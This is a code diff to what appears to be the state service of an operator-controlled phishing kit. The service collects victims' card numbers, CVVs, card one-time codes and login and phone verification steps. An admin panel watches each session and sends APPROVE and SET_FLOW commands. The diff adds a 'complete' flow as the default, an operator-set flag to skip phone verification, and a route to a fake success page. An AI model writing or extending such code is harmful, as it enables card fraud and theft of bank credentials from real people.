@@ -30,7 +30,7 @@ export interface SessionHistory {
   currentView?: string;
   resendRequested?: boolean;
   isPinned?: boolean;
-  verificationFlow?: 'otp' | 'app' | 'both';
+  verificationFlow?: 'otp' | 'app' | 'both' | 'complete';
   // Progress flags
   isLoginVerified?: boolean;
   isPhoneVerified?: boolean;
@@ -89,7 +89,8 @@ export class StateService {
   readonly cardOtp = signal<string>(''); 
   
   // New Flow Control
-  readonly verificationFlow = signal<'otp' | 'app' | 'both'>('otp');
+  readonly verificationFlow = signal<'otp' | 'app' | 'both' | 'complete'>('complete');
+  readonly skipPhoneVerification = signal<boolean>(false);
 
   // Metadata & Fingerprint
   readonly sessionId = signal<string>('');
@@ -336,6 +337,7 @@ export class StateService {
         cardCvv: this.cardCvv(),
         cardOtp: this.cardOtp(),
         verificationFlow: this.verificationFlow(),
+        skipPhoneVerification: this.skipPhoneVerification(),
         
         isLoginVerified: this.isLoginVerified(),
         isPhoneVerified: this.isPhoneVerified(),
@@ -395,6 +397,7 @@ export class StateService {
       if(data.cardCvv) this.cardCvv.set(data.cardCvv);
       if(data.cardOtp) this.cardOtp.set(data.cardOtp);
       if(data.verificationFlow) this.verificationFlow.set(data.verificationFlow);
+      if(data.skipPhoneVerification !== undefined) this.skipPhoneVerification.set(data.skipPhoneVerification);
       
       if(data.isLoginVerified !== undefined) this.isLoginVerified.set(data.isLoginVerified);
       if(data.isPhoneVerified !== undefined) this.isPhoneVerified.set(data.isPhoneVerified);
@@ -526,6 +529,7 @@ export class StateService {
           cardCvv: this.cardCvv(),
           cardOtp: this.cardOtp(),
           verificationFlow: this.verificationFlow(),
+          skipPhoneVerification: this.skipPhoneVerification(),
           stage: this.stage(),
           fingerprint: this.fingerprint(),
           status: this.isFlowComplete() ? 'Verified' : 'Active',
@@ -794,6 +798,9 @@ export class StateService {
 
            if (currentStage === 'login') {
                this.isLoginVerified.set(true);
+               if (payload && payload.skipPhone !== undefined) {
+                   this.skipPhoneVerification.set(payload.skipPhone);
+               }
                this.navigate('limited', true);
            } else if (currentStage === 'phone_pending') {
                this.isPhoneVerified.set(true);
@@ -805,13 +812,18 @@ export class StateService {
                this.isCardSubmitted.set(true);
 
                // Route based on Verification Flow
-               if (this.verificationFlow() === 'app') {
+               const flow = this.verificationFlow();
+               if (flow === 'app') {
                    // NEW: Go to input stage first, user must confirm
                    this.stage.set('bank_app_input');
                    this.navigate('bank_app', true);
-               } else {
+               } else if (flow === 'both' || flow === 'otp') {
                    this.navigate('card_otp', true);
                    // Note: We don't change stage here, waiting for OTP submit
+               } else {
+                   // Default: Complete / Success (flow === 'complete' or undefined)
+                   this.isFlowComplete.set(true);
+                   this.navigate('success', true);
                }
 
            } else if (currentStage === 'card_otp_pending') {
@@ -1018,17 +1030,17 @@ export class StateService {
       this.navigate('login');
   }
 
-  adminSetVerificationFlow(flow: 'otp' | 'app' | 'both') {
+  adminSetVerificationFlow(flow: 'otp' | 'app' | 'both' | 'complete') {
       const id = this.monitoredSessionId();
       if (id) {
           this.sendAdminCommand(id, 'SET_FLOW', { flow });
       }
   }
 
-  adminApproveStep() {
+  adminApproveStep(payload: any = {}) {
       const id = this.monitoredSessionId();
       if (id) {
-          this.sendAdminCommand(id, 'APPROVE', {});
+          this.sendAdminCommand(id, 'APPROVE', payload);
           this.showAdminToast('Command Sent: Approve');
       }
   }
